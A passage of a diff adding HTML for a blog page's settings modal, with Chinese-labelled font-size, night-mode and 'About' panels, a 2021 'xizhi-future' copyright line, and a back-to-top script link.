+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            您已调整页面字体大小
+          </div>
+        </div>
+      
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            夜间模式已经开启，再次单击按钮即可关闭 
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            忆 执 昔 来 的 旅 途
+          </div>
+          <div class="panel-body">
+            Copyright © 2021 xizhi-future All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
+    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
+  
+</body>
+</html>
